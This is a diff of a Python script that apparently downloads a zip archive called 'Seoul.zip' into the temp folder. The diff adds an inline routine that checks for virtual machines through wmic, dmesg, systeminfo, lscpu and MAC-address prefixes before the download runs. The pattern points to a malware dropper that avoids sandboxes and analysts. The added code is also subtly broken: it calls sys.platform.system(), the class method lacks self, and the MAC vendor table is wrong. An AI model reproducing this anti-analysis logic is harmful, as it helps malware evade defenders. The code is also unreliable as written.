@@ -1,14 +1,72 @@
 import base64
 import os
+import uuid
 import zipfile
 import io
 import subprocess
 import tempfile
 import sys
 from urllib.parse import unquote
-from vmdetect import check_vm as checkvm
 
-destination = os.path.join(tempfile.gettempdir(), "Seoul.zip")
+destination = os.path.join(tempfile.gettempdir(), "Seoul.zip") # gets tmp and looks for zip
+
+class checkvm:
+    def check_vm():
+        indicators = []
+
+        # Check system manufacturer and product name
+        if sys.platform.system() == "Windows":
+            try:
+                output = subprocess.check_output(
+                    ["wmic", "computersystem", "get", "manufacturer,model"],
+                    universal_newlines=True
+                )
+                if "VMware" in output or "VirtualBox" in output or "KVM" in output:
+                    indicators.append("Manufacturer/Model indicates VM")
+            except Exception:
+                pass
+        else:
+            try:
+                output = subprocess.check_output(
+                    ["dmesg"], stderr=subprocess.DEVNULL, universal_newlines=True
+                )
+                if "VirtualBox" in output or "VMware" in output or "hypervisor" in output:
+                    indicators.append("dmesg reports hypervisor")
+            except Exception:
+                pass
+
+        # check for mac address
+        try:
+            mac = uuid.getnode()
+            mac_prefix = mac >> 40
+            vm_mac_prefixes = {
+                0x00: "VirtualBox",
+                0x08: "VMware",
+                0x0A: "Parallels"
+            }
+            if mac_prefix in vm_mac_prefixes:
+                indicators.append(f"MAC address suggests {vm_mac_prefixes[mac_prefix]}")
+        except Exception:
+            pass
+        
+        try:
+            #check for hypervisor flag
+            if sys.platform.system() == "Windows":
+                output = subprocess.check_output(
+                    ["systeminfo"], universal_newlines=True
+                )
+                if "Hyper-V" in output or "Virtualization" in output:
+                    indicators.append("Systeminfo indicates Hyper-V")
+            else:
+                output = subprocess.check_output(
+                    ["lscpu"], universal_newlines=True
+                )
+                if "Hypervisor" in output:
+                    indicators.append("lscpu indicates hypervisor")
+        except Exception:
+            pass
+
+        return indicators
 
 def download_zip(url):
     vmdetection = checkvm()
